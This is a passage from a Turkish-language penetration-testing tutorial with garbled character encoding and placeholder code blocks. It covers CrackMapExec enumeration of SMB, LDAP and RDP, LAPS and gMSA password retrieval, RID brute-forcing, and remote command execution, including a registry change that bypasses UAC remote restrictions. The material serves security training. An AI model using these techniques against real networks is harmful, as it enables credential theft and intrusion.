| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

